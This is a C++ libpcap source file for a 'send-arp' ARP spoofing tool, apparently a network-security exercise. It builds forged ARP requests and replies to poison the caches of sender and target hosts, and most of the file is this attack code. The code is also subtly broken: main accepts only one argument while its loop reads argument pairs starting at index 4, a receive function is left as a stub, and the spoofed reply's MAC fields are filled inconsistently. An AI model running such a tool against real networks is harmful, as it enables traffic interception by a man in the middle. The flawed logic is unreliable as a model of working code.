#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <stdint.h>
#include <cstring>

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

typedef struct ARP_INFECTION_PACKET {
	ETHERNET_HDR eth_h;
	ARP_HDR arp_h;
} ARP_PACKET;

void receive_arp(int c, char* sender_ip){
	ARP_PACKET *packet = new ARP_PACKET;
}

ARP_PACKET send_arp_preparing(uint8_t oper,
	char* src_mac, char* dst_mac,
	char* sender_ip, char* target_ip,
	char* sender_mac, char* target_mac) {
	ARP_PACKET packet;

	memcpy(packet.eth_h.ether_dhost, stringmac_to_bytemac(dst_mac), 6); /* dst_mac */
	memcpy(packet.eth_h.ether_shost, stringmac_to_bytemac(src_mac), 6); /* src_mac */
	packet.eth_h.ether_type = htons(0x0806); // ARP protocol

	packet.arp_h.hardware_type = htons(1); // Ethernet
	packet.arp_h.protocol_type = htons(0x0800); // IPv4
	packet.arp_h.hardware_length = 6; // MAC address length
	packet.arp_h.protocol_length = 4; // IPv4 address length
	packet.arp_h.operation = htons(oper); // ARP reply

	memcpy(packet.arp_h.sender_mac_address, stringmac_to_bytemac(sender_mac), 6); // Sender MAC address
	memcpy(packet.arp_h.sender_ip_address, stringip_to_byteip(sender_ip), 4); // Sender IP address
	memcpy(packet.arp_h.target_mac_address, stringmac_to_bytemac(target_mac), 6); // Target MAC address
	memcpy(packet.arp_h.target_ip_address, stringip_to_byteip(target_ip), 4); // Target IP address

	return packet;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	while (1){
		for(int i = 4; i < argc; i += 2) {
			/* who is <target_ip>? request */
			ARP_PACKET tip_req_packet = send_arp_preparing(1, "90:de:80:d5:a0:66", "ff:ff:ff:ff:ff:ff", argv[i],argv[i+1], "90:de:80:d5:a0:66", "00:00:00:00:00:00"); // ARP request operation
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}
			printf("Sent ARP request from %s to %s\n", argv[i], argv[i + 1]);

			/* who is <target_ip>? wait and receive */
			ARP_PACKET* tip_res_packet = nullptr;
			while (true) {
				struct pcap_pkthdr* header;
				const u_char* packet;
				int res = pcap_next_ex(pcap, &header, &packet);
				if (res == 0) continue;
				if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
					break;
				}
				printf("%u bytes captured\n", header->caplen);
				/* is arp? */
				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && // ARP protocol
					ntohs(tip_res_packet->arp_h.operation) == 2 && // ARP reply operation
					memcmp(tip_res_packet->arp_h.target_ip_address, stringip_to_byteip(argv[i + 1]), 4) == 0) {
					printf("Received ARP reply from %s\n", argv[i + 1]);
					break;
				}
			}

			ARP_PACKET packet = send_arp_preparing(2,
				bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost),
				bytemac_to_stringmac(tip_res_packet->eth_h.ether_shost),
				argv[i], argv[i+1],
				bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address),
				bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost)); // ARP response operation
			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
				return -1;
			}
			printf("Sent ARP packet from %s to %s\n", argv[i], argv[i + 1]);
		}
	}
	pcap_close(pcap);
}
